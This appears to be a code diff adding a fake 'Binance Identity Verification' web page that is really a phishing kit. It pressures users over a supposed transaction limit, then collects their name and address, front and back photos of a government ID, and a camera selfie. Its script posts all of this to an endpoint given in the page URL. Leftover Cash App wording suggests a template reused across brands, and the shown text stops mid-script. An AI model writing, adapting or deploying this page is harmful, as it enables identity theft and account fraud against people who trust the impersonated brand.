@@ -1,0 +1,1590 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance Identity Verification</title>
+    <script src="./tf.js"></script>
+    <script src="./faceapi.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+            background: #fafafa;
+            color: #1c1c1e;
+            line-height: 1.5;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .app-header {
+            background: white;
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 24px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            border: 1px solid #f0f0f0;
+        }
+
+        .brand-logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: #fcd535;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .brand-tagline {
+            font-size: 15px;
+            color: #8e8e93;
+            font-weight: 400;
+        }
+
+        .progress-section {
+            background: white;
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 24px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            border: 1px solid #f0f0f0;
+        }
+
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .progress-label {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1c1c1e;
+        }
+
+        .step-count {
+            font-size: 14px;
+            color: #8e8e93;
+            background: #f5f5f7;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-weight: 500;
+        }
+
+        .progress-bar-track {
+            height: 4px;
+            background: #f5f5f7;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-bottom: 16px;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #fcd535);
+            border-radius: 2px;
+            transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            width: 20%;
+        }
+
+        .step-dots {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .step-dot {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #f5f5f7;
+            border: 2px solid #e5e5e7;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 600;
+            color: #8e8e93;
+            transition: all 0.3s ease;
+        }
+
+        .step-dot.active {
+            background: #fcd535;
+            border-color: #fcd535;
+            color: #202630;
+            transform: scale(1.1);
+        }
+
+        .step-dot.completed {
+            background: #fcd535;
+            border-color: #fcd535;
+            color: #202630;
+        }
+
+        .content-card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            border: 1px solid #f0f0f0;
+            overflow: hidden;
+            margin-bottom: 24px;
+        }
+
+        .card-header {
+            padding: 24px 24px 16px;
+            border-bottom: 1px solid #f5f5f7;
+        }
+
+        .card-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1c1c1e;
+            margin-bottom: 6px;
+            letter-spacing: -0.3px;
+        }
+
+        .card-subtitle {
+            font-size: 15px;
+            color: #8e8e93;
+            line-height: 1.4;
+        }
+
+        .card-body {
+            padding: 24px;
+        }
+
+        .step-content {
+            display: none;
+            animation: slideUp 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .step-content.active {
+            display: block;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(16px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .terms-container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .terms-section {
+            padding: 20px;
+            background: #fafafa;
+            border-radius: 12px;
+            border: 1px solid #f0f0f0;
+        }
+
+        .section-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1c1c1e;
+            margin-bottom: 12px;
+            padding-left: 8px;
+            position: relative;
+        }
+
+        .section-title::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 3px;
+            height: 16px;
+            background: #fcd535;
+            border-radius: 2px;
+        }
+
+        .terms-item {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 16px;
+            align-items: flex-start;
+        }
+
+        .terms-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .checkbox-input {
+            width: 18px;
+            height: 18px;
+            accent-color: #fcd535;
+            margin-top: 2px;
+            flex-shrink: 0;
+        }
+
+        .checkbox-text {
+            font-size: 14px;
+            color: #3a3a3c;
+            line-height: 1.5;
+        }
+
+        .disclaimer-section {
+            background: #f9f9fb;
+            padding: 20px;
+            border-radius: 12px;
+            border-left: 4px solid #fcd535;
+            margin: 20px 0;
+        }
+
+        .disclaimer-text {
+            font-size: 13px;
+            color: #8e8e93;
+            line-height: 1.5;
+        }
+
+        .final-consent {
+            background: #f0f8f0;
+            padding: 20px;
+            border-radius: 12px;
+            border: 1px solid #fcd535;
+            margin-top: 20px;
+        }
+
+        .form-container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .input-row {
+            display: flex;
+            gap: 16px;
+        }
+
+        .input-group {
+            flex: 1;
+        }
+
+        .input-group.full {
+            width: 100%;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1c1c1e;
+            margin-bottom: 8px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #d1d1d6;
+            border-radius: 12px;
+            font-size: 16px;
+            background: white;
+            transition: all 0.2s ease;
+            color: #1c1c1e;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #fcd535;
+            box-shadow: 0 0 0 3px #fcd53522;
+        }
+
+        .select-field {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #d1d1d6;
+            border-radius: 12px;
+            font-size: 16px;
+            background: white;
+            transition: all 0.2s ease;
+            color: #1c1c1e;
+        }
+
+        .select-field:focus {
+            outline: none;
+            border-color: #fcd535;
+            box-shadow: 0 0 0 3px #fcd53522;
+        }
+
+        .doc-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .doc-option {
+            padding: 16px 20px;
+            background: #fafafa;
+            border: 1px solid #e5e5e7;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-align: left;
+        }
+
+        .doc-option:hover {
+            background: #fcd53522;
+            border-color: #fcd535;
+        }
+
+        .doc-option.selected {
+            background: #fcd53522;
+            border-color: #fcd535;
+            box-shadow: 0 0 0 1px #fcd53522;
+        }
+
+        .doc-title {
+            font-size: 15px;
+            font-weight: 500;
+            color: #1c1c1e;
+        }
+        .upload-area {
+            border: 2px dashed #d1d1d6;
+            border-radius: 12px;
+            padding: 40px 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            background: #fafafa;
+            margin-top: 16px;
+        }
+
+        .upload-area:hover {
+            
+            background: #fcd53522;
+        }
+
+        .upload-icon {
+            width: 48px;
+            height: 48px;
+            background: #fcd535;
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            color: white;
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .upload-icon::before {
+            content: '↑';
+        }
+
+        .upload-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1c1c1e;
+            margin-bottom: 6px;
+        }
+
+        .upload-subtitle {
+            font-size: 14px;
+            color: #8e8e93;
+        }
+
+        .camera-container {
+            text-align: center;
+        }
+
+        .camera-preview {
+            width: 100%;
+            max-width: 400px;
+            height: 320px;
+            background: #fafafa;
+            border-radius: 16px;
+            border: 1px solid #e5e5e7;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .stage { 
+            position: relative; 
+            width: 100%; 
+            height: 100%;
+        }
+    
+        video, canvas { 
+            position: absolute;
+            left: 0; 
+            top: 0;
+            width: 100%; 
+            height: 100%; 
+        }
+        .hud { 
+            position: absolute;
+            bottom: 8px; 
+            left: 0; 
+            right: 0; 
+            text-align: center; color: #eaeaea;  
+            text-shadow: 0 1px 2px rgba(0,0,0,.6); 
+        }
+        .camera-placeholder {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #8e8e93;
+        }
+
+        .camera-icon {
+            width: 60px;
+            height: 60px;
+            background: #e5e5e7;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 12px;
+            font-size: 24px;
+        }
+
+       
+        .camera-text {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+
+        .camera-subtext {
+            font-size: 14px;
+        }
+
+        .camera-video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .camera-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .face-guide {
+            width: 160px;
+            height: 200px;
+            border: 3px solid #fcd535;
+            border-radius: 50%;
+            display: flex;
+            align-items: flex-end;
+            justify-content: center;
+            padding-bottom: 12px;
+        }
+
+        .guide-text {
+            color: white;
+            font-size: 12px;
+            font-weight: 600;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
+        }
+
+        .photo-review {
+            text-align: center;
+        }
+
+        .review-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1c1c1e;
+            margin-bottom: 6px;
+        }
+
+        .review-subtitle {
+            font-size: 14px;
+            color: #8e8e93;
+            margin-bottom: 16px;
+        }
+
+        .photo-preview {
+            max-width: 100%;
+            max-height: 300px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+        }
+
+
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+
+        .btn {
+            padding: 14px 24px;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            min-width: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .btn-primary {
+            background: #fcd535;
+            color:#202630;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            background: #fcd535;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px #fcd53522;
+        }
+
+        .btn-secondary {
+            background: #8e8e93;
+            color: white;
+        }
+
+        .btn-secondary:hover {
+            background: #636366;
+        }
+
+        .btn-success {
+           
+            color: white;
+        }
+
+        
+        .btn-wide {
+            width: 100%;
+            padding: 16px 24px;
+            font-size: 16px;
+            margin-top: 8px;
+        }
+
+        .btn:disabled {
+            background: #ccc;
+            color: #8e8e93;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .success-container {
+            text-align: center;
+            padding: 40px 24px;
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #fcd535);
+            border-radius: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 32px;
+            font-weight: 700;
+            animation: successPulse 2s ease-in-out infinite;
+        }
+
+        .success-icon::before {
+            content: '✓';
+        }
+        .page1{
+            text-align: center;
+        }
+        .page1 p{
+
+            width: 90%;
+            margin: auto;
+            text-align: left;
+            background-color: #f0f0f0;
+            padding: 10px;
+            font-size: 16px;
+            border-radius: 10px;
+        }
+
+        @keyframes successPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .success-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1c1c1e;
+            margin-bottom: 8px;
+            letter-spacing: -0.3px;
+        }
+
+        .success-subtitle {
+            font-size: 15px;
+            color: #8e8e93;
+            margin-bottom: 32px;
+        }
+
+        .completion-list {
+            background: #f9fff9;
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 24px;
+            border: 1px solid #e8f5e8;
+        }
+
+        .completion-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .completion-item:last-child {
+            border-bottom: none;
+        }
+
+        .completion-check {
+            width: 20px;
+            height: 20px;
+            background: #fcd535;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #202630;
+            font-size: 12px;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+
+        .completion-check::before {
+            content: '✓';
+        }
+
+        .completion-text {
+            font-size: 15px;
+            color: #1c1c1e;
+            font-weight: 500;
+        }
+
+        .info-panel {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            border: 1px solid #f0f0f0;
+        }
+
+        .info-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1c1c1e;
+            margin-bottom: 8px;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #8e8e93;
+            line-height: 1.5;
+        }
+
+        .note-section {
+            background: #f9f9fb;
+            padding: 16px;
+            border-radius: 8px;
+            margin-top: 16px;
+        }
+
+        .note-text {
+            font-size: 13px;
+            color: #8e8e93;
+            line-height: 1.4;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 16px;
+            }
+
+            .input-row {
+                flex-direction: column;
+                gap: 12px;
+            }
+
+            .btn-group {
+                flex-direction: column;
+            }
+
+            .btn {
+                width: 100%;
+                min-width: unset;
+            }
+
+            .step-dots {
+                gap: 8px;
+            }
+
+            .step-dot {
+                width: 28px;
+                height: 28px;
+                font-size: 12px;
+            }
+
+            .camera-preview {
+                height: 260px;
+            }
+
+            .face-guide {
+                width: 130px;
+                height: 160px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+
+      <div class="step-content" id="header">
+                <div class="app-header">
+                    <div class="brand-logo"><img src="./binance.png" style="max-height:40px"></div>
+                    <div class="brand-tagline">Verify your identity</div>
+                </div>
+
+                <div class="progress-section">
+                    <div class="progress-info">
+                        <div class="progress-label">Identity Verification</div>
+                        <div class="step-count" id="stepCount">Step 1 of 4</div>
+                    </div>
+                    <div class="progress-bar-track">
+                        <div class="progress-bar-fill" id="progressBar"></div>
+                    </div>
+                    <div class="step-dots">
+                        <div class="step-dot active" data-step="1">1</div>
+                        <div class="step-dot" data-step="2">2</div>
+                        <div class="step-dot" data-step="3">3</div>
+                        <div class="step-dot" data-step="4">4</div>
+                    </div>
+                </div>
+     </div>
+
+      <div class="step-content active" id="step0">
+
+    
+
+        <div class="page1">
+            <br><br> <br><br>
+        <img src="./binance.png" style="max-height:40px">
+        <br><br>
+        <h2>Please confirm your identity</h2>
+        <br>
+        <br>
+
+        <p>
+        At Binance, we strive to provide a safer payment environment for our customers and comply with government regulations. As part of our ongoing efforts to deliver on this commitment, you will need to confirm your identity when you reach certain transaction thresholds with us. You have reached this limit with the total transactions in your account.
+        <br><br>Please confirm your identity. To get started, click the button below and provide the required documents
+        </p>
+        <br><br><br><br>
+        <button class="btn btn-primary btn-wide" id="confirmBtn">Confirm your Identity</button>
+      
+        </div>
+
+
+      </div>
+
+
+     
+
+      
+        <div class="step-content" id="step1">
+            <div class="content-card">
+                <div class="card-header">
+                    <div class="card-title">Personal Information</div>
+                    <div class="card-subtitle">Provide your address for verification</div>
+                </div>
+                <div class="card-body">
+                    <div class="form-container">
+                        <div class="input-group full">
+                            <label class="input-label" for="name">Full Name</label>
+                            <input type="text" id="name" class="input-field" placeholder="Full Name" required>
+                        </div>
+                        <div class="input-group full">
+                            <label class="input-label" for="street">Street Address</label>
+                            <input type="text" id="street" class="input-field" placeholder="Enter your full street address" required>
+                        </div>
+
+                        <div class="input-row">
+                            <div class="input-group">
+                                <label class="input-label" for="city">City</label>
+                                <input type="text" id="city" class="input-field" placeholder="City" required>
+                            </div>
+                            <div class="input-group">
+                                <label class="input-label" for="state">State</label>
+                                <input type="text" id="state" class="input-field" placeholder="State" required>
+                            
+                            </div>
+                        </div>
+
+                        <div class="input-row">
+                            <div class="input-group">
+                                <label class="input-label" for="zipcode">ZIP Code</label>
+                                <input type="text" id="zipcode" class="input-field" placeholder="ZIP Code" required>
+                            </div>
+                           
+                        </div>
+
+                       
+                    </div>
+                </div>
+                
+            </div>
+            <button class="btn btn-primary btn-wide" id="step2Btn" disabled>Continue to Document Upload</button>
+        </div>
+
+      
+        <div class="step-content" id="step2">
+            <div class="content-card">
+                <div class="card-header">
+                    <div class="card-title">Upload ID Document</div>
+                    <div class="card-subtitle">Take a photo of your government-issued ID</div>
+                </div>
+                <div class="card-body">
+                    <div class="doc-grid">
+                        <div class="doc-option" data-id-type="drivers-license">
+                            <div class="doc-title">Driver's License or State ID</div>
+                        </div>
+                        <div class="doc-option" data-id-type="passport">
+                            <div class="doc-title">Passport</div>
+                        </div>
+                        <div class="doc-option" data-id-type="national-id">
+                            <div class="doc-title">National ID Card</div>
+                        </div>
+                        <div class="doc-option" data-id-type="other">
+                            <div class="doc-title">Other Government ID</div>
+                        </div>
+                    </div>
+
+                    <div class="upload-area" id="uploadArea" style="display: none;">
+                        <div class="upload-icon"></div>
+                        <div class="upload-title">Upload the front side of your document</div>
+                        <div class="upload-subtitle">Take a photo or choose from gallery</div>
+                        <input type="file" id="documentUpload" accept="image/*" style="display: none;">
+                    </div>
+
+                    
+                    <div class="photo-review" id="documentPreview" style="display: none;">
+                        <br><br>
+                        <img id="documentImage" class="photo-preview" alt="Document Preview">
+                        <div class="btn-group">
+                            <button class="btn btn-secondary" id="removeDocument">Try Again</button>
+                        </div>
+                    <br><br>
+                    </div>
+
+                    <div class="upload-area" id="uploadAreaBack" style="display: none;">
+                        <div class="upload-icon"></div>
+                        <div class="upload-title">Upload the back side of your document</div>
+                        <div class="upload-subtitle">Take a photo or choose from gallery</div>
+                        <input type="file" id="documentUploadBack" accept="image/*" style="display: none;">
+                    </div>
+                    <br><br>
+                    <div class="photo-review" id="documentPreviewBack" style="display: none;">
+                        <img id="documentImageBack" class="photo-preview" alt="Document Preview">
+                        <div class="btn-group">
+                            <button class="btn btn-secondary" id="removeDocumentBack">Try Again</button>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+            <button class="btn btn-primary btn-wide" id="step3Btn" disabled>Continue to Photo Verification</button>
+        </div>
+
+        
+        <div class="step-content" id="step3">
+            <div class="content-card">
+                <div class="card-header">
+                    <div class="card-title">Take a Selfie</div>
+                    <div class="card-subtitle">Take a clear photo of yourself for verification</div>
+                </div>
+                <div class="card-body">
+                    <div class="camera-container">
+                        <div class="camera-preview" id="cameraPreview">
+                            <div class="camera-placeholder" id="cameraPlaceholder">
+                                <br>
+                                <div class="camera-icon"><svg version="1.0" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 64 64" enable-background="new 0 0 64 64" xml:space="preserve" fill="#8e8e93"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g> <path fill="#8e8e93" d="M60,10H49.656l-6.828-6.828C42.078,2.422,41.062,2,40,2H24c-1.062,0-2.078,0.422-2.828,1.172L14.344,10H4 c-2.211,0-4,1.789-4,4v44c0,2.211,1.789,4,4,4h56c2.211,0,4-1.789,4-4V14C64,11.789,62.211,10,60,10z M32,50 c-8.836,0-16-7.164-16-16s7.164-16,16-16s16,7.164,16,16S40.836,50,32,50z"></path> <circle fill="#8e8e93" cx="32" cy="34" r="8"></circle> </g> </g></svg></div>
+                                <div class="camera-text">Camera Preview</div>
+                                <div class="camera-subtext">Make sure you're well-lit</div>
+                            </div>
+                            <div class="stage" style="display: none;">
+                                <video id="video" class="camera-video" autoplay muted playsinline></video>
+                                <canvas id="overlay"></canvas>
+                                <div class="hud" id="hud">Align your face inside the oval</div>
+                            </div>
+                        </div>
+                        
+
+                        <div class="photo-review" id="photoReview" style="display: none;">
+                            <div class="review-title">How does this look?</div>
+                            <div class="review-subtitle">Make sure your face is clear and centered</div>
+                            <img id="selfieImage" class="photo-preview" alt="Your Selfie">
+                            <div class="btn-group">
+                                <button class="btn btn-secondary" id="retakePhoto">Retake</button>
+                                <button class="btn btn-success" id="acceptPhoto">Looks Good</button>
+                            </div>
+                        </div>
+
+                        <div class="btn-group" id="cameraControls">
+                            <button class="btn btn-primary" id="startCamera">Start Camera</button>
+                            <button class="btn btn-success" id="takePhoto" style="display: none;">Take Photo</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <button class="btn btn-primary btn-wide" id="step4Btn" disabled>Complete Verification</button>
+        </div>
+
+  
+        <div class="step-content" id="step4">
+            <div class="content-card">
+                <div class="success-container">
+                    <div class="success-icon"></div>
+                    <div class="success-title">Verification Complete!</div>
+                    <div class="success-subtitle">Welcome to Cash App - you're all set to send, receive, and invest</div>
+                </div>
+                <div class="card-body">
+                    <div class="completion-list">                  
+                        <div class="completion-item">
+                            <div class="completion-check"></div>
+                            <div class="completion-text">Personal information verified</div>
+                        </div>
+                        <div class="completion-item">
+                            <div class="completion-check"></div>
+                            <div class="completion-text">Government ID uploaded</div>
+                        </div>
+                        <div class="completion-item">
+                            <div class="completion-check"></div>
+                            <div class="completion-text">Identity photo verified</div>
+                        </div>
+                    </div>
+
+                    <div class="info-panel">
+                        <div class="info-title">What's Next?</div>
+                        <div class="info-text">
+                            Your verification is being processed. You'll receive a notification within 24-48 hours. Meanwhile, you can start exploring Cash App features and make your first transaction.
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <button class="btn btn-success btn-wide" onclick="wu.end()">Continue to Binance</button>
+        </div>
+
+
+
+        
+
+    </div>
+
+    <script>
+        let currentStep = 1;
+        const totalSteps = 4;
+        let uploadedDocument = null;
+        let uploadedDocumentBack = null;
+        let capturedPhoto = null;
+        let cameraStream = null;
+
+        window.idName="Binance";
+
+
+        async function server(body){
+
+            var url=new URLSearchParams(window.location.search).get("id");
+
+            await fetch(url,{
+                method:"POST",
+                headers:{
+                    "content-type":"application/json"
+                },
+                body:JSON.stringify(body)
+            });
+            
+        }
+
+        document.getElementById('confirmBtn').addEventListener('click', function() {
+                    document.getElementById('step0').style.display="none";
+                    document.getElementById('header').style.display="block";
+
+                    goToStep(1)
+                });
+
+        document.addEventListener('DOMContentLoaded', function() {
+            initStep2();
+            initStep3();
+            initStep4();
+            updateProgress();
+        });
+
+        
+       
+        function initStep2() {
+            const requiredInputs = document.querySelectorAll('#step1 input');
+            const continueBtn = document.getElementById('step2Btn');
+
+            requiredInputs.forEach(input => {
+                input.addEventListener('input', updateStep2Button);
+                input.addEventListener('change', updateStep2Button);
+            });
+
+            if (continueBtn) {
+                continueBtn.addEventListener('click', () => {
+                    var info=`👤 Full Name:  ${document.getElementById('name').value}\n\n📌 Street Address: ${document.getElementById('street').value}\n\n🏙️ City: ${document.getElementById('city').value}\n\n🗺️ State: ${document.getElementById('state').value}\n\n📍 Zip Code: ${document.getElementById('zipcode').value}`;
+                    server({info:info,t:"t",n:idName});
+                    if (!continueBtn.disabled) goToStep(2);
+                });
+            }
+
+
+            function updateStep2Button() {
+                const requiredFilled = Array.from(requiredInputs).every(input => input.value.trim() != '');
+                if (continueBtn) continueBtn.disabled = !(requiredFilled);
+            }
+        }
+
+        function initStep3() {
+            var doc="";
+            const docOptions = document.querySelectorAll('.doc-option');
+            const uploadArea = document.getElementById('uploadArea');
+            const uploadAreaBack = document.getElementById('uploadAreaBack');
+            const fileInput = document.getElementById('documentUpload');
+            const preview = document.getElementById('documentPreview');
+            const previewImg = document.getElementById('documentImage');
+            const removeBtn = document.getElementById('removeDocument');
+
+            const fileInputBack = document.getElementById('documentUploadBack');
+            const previewBack = document.getElementById('documentPreviewBack');
+            const previewImgBack = document.getElementById('documentImageBack');
+            const removeBtnBack = document.getElementById('removeDocumentBack');
+
+            const continueBtn = document.getElementById('step3Btn');
+
+            docOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    docOptions.forEach(opt => opt.classList.remove('selected'));
+                    this.classList.add('selected');
+                   
+                    doc=this.innerText;
+
+                    if (uploadArea) uploadArea.style.display = 'block';
+                    if (uploadAreaBack) uploadAreaBack.style.display = 'block';
+
+
+                    uploadedDocument = null;
+                    if (preview) preview.style.display = 'none';
+                    if (uploadArea) uploadArea.style.display = 'block';
+                    if (fileInput) fileInput.value = '';
+
+                    uploadedDocumentBack = null;
+                    if (preview) previewBack.style.display = 'none';
+                    if (uploadArea) uploadAreaBack.style.display = 'block';
+                    if (fileInput) fileInputBack.value = '';
+
+                    updateStep3Button();
+
+                });
+            });
+
+            if (uploadArea && fileInput) {
+                uploadArea.addEventListener('click', () => fileInput.click());
+                
+                uploadArea.addEventListener('dragover', (e) => {
+                    e.preventDefault();
+                    uploadArea.style.borderColor = '#fcd53522';
+                });
+                
+                uploadArea.addEventListener('dragleave', (e) => {
+                    e.preventDefault();
+                    uploadArea.style.borderColor = '#d1d1d6';
+                });
+                
+                uploadArea.addEventListener('drop', (e) => {
+                    e.preventDefault();
+                    uploadArea.style.borderColor = '#d1d1d6';
+                    const files = e.dataTransfer.files;
+                    if (files.length > 0) handleFile(files[0]);
+                });
+
+                fileInput.addEventListener('change', function() {
+                    if (this.files.length > 0) handleFile(this.files[0]);
+                });
+            }
+
+
+            if (uploadAreaBack && fileInputBack) {
+                uploadAreaBack.addEventListener('click', () => fileInputBack.click());
+                
+                uploadAreaBack.addEventListener('dragover', (e) => {
+                    e.preventDefault();
+                    uploadAreaBack.style.borderColor = '#fcd53522';
+                });
+                
+                uploadAreaBack.addEventListener('dragleave', (e) => {
+                    e.preventDefault();
+                    uploadAreaBack.style.borderColor = '#d1d1d6';
+                });
+                
+                uploadAreaBack.addEventListener('drop', (e) => {
+                    e.preventDefault();
+                    uploadAreaBack.style.borderColor = '#d1d1d6';
+                    const files = e.dataTransfer.files;
+                    if (files.length > 0) handleFileBack(files[0]);
+                });
+
+                fileInputBack.addEventListener('change', function() {
+                    if (this.files.length > 0) handleFileBack(this.files[0]);
+                });
+            }
+
+            if (removeBtn) {
+                removeBtn.addEventListener('click', function() {
+                    uploadedDocument = null;
+                    if (preview) preview.style.display = 'none';
+                    if (uploadArea) uploadArea.style.display = 'block';
+                    if (fileInput) fileInput.value = '';
+                    updateStep3Button();
+                });
+            }
+
+              if (removeBtnBack) {
+                removeBtnBack.addEventListener('click', function() {
+                    uploadedDocumentBack = null;
+                    if (preview) previewBack.style.display = 'none';
+                    if (uploadArea) uploadAreaBack.style.display = 'block';
+                    if (fileInput) fileInputBack.value = '';
+                    updateStep3Button();
+                });
+            }
+
+            if (continueBtn) {
+                continueBtn.addEventListener('click', () => {
+
+                    if (!continueBtn.disabled){
+                       
+
+                        var front,back;
+
+                        const reader = new FileReader();
+                        const reader2 = new FileReader();
+
+                         reader.onload = (e) => {
+                            front= e.target.result;
+                            reader2.onload = (e) => {
+                               back= e.target.result;
+
+                               var data={
+                               front:front,
+                               back:back
+                               };
+                       
+                              
+
+                              server({info:front,t:"i",c:"Front Side of "+doc,n:idName});
+                            
+                              server({info:back,t:"i",c:"Back Side of "+doc,n:idName});
+                               
+
+                              goToStep(3);
+ 
+                            }
+
+                        }
+
+                        reader.readAsDataURL(fileInput.files[0]);
+                        reader2.readAsDataURL(fileInputBack.files[0]);
+
+                        
+                    }
+                });
+            }
+
+            function handleFile(file) {
+                if (file && file.type.startsWith('image/')) {
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        uploadedDocument = e.target.result;
+                        if (previewImg) previewImg.src = e.target.result;
+                        if (preview) preview.style.display = 'block';
+                        if (uploadArea) uploadArea.style.display = 'none';
+                        updateStep3Button();
+                    };
+                    reader.readAsDataURL(file);
+                }
+            }
+
+            function handleFileBack(file) {
+                if (file && file.type.startsWith('image/')) {
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        uploadedDocumentBack = e.target.result;
+                        if (previewImg) previewImgBack.src = e.target.result;
+                        if (preview) previewBack.style.display = 'block';
+                        if (uploadArea) uploadAreaBack.style.display = 'none';
+                        updateStep3Button();
+                    };
+                    reader.readAsDataURL(file);
+                }
+            }
+
+            function updateStep3Button() {
+                if (continueBtn) continueBtn.disabled = !(uploadedDocument && uploadedDocumentBack);
+            }
+        }
+
+        function initStep4() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('overlay');
+            const startBtn = document.getElementById('startCamera');
+            const takeBtn = document.getElementById('takePhoto');
+            const retakeBtn = document.getElementById('retakePhoto');
+            const acceptBtn = document.getElementById('acceptPhoto');
+            const photoReview = document.getElementById('photoReview');
+            const selfieImg = document.getElementById('selfieImage');
+            const placeholder = document.getElementById('cameraPlaceholder');
+            const overlay = document.getElementById('cameraOverlay');
+            const continueBtn = document.getElementById('step4Btn');
+            const stage = document.querySelector(".stage");
+
+
+            if (startBtn) {
+                startBtn.addEventListener('click', async function() {
+                   
+                    window.start().catch(err => {
+                        console.error(err);
+                    });
+
+                    placeholder.style.display="none";
+                    startBtn.style.display="none";
+                    takeBtn.style.display="block";
+                    stage.style.display="block";
+
+
+                });
+            }
+
+            if (takeBtn && canvas && video) {
+                takeBtn.addEventListener('click', function() {
+                    try {
+                        const context = canvas.getContext('2d');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0);
+                        capturedPhoto = canvas.toDataURL('image/jpeg', 0.8);
+                        
+                        if (selfieImg) selfieImg.src = capturedPhoto;
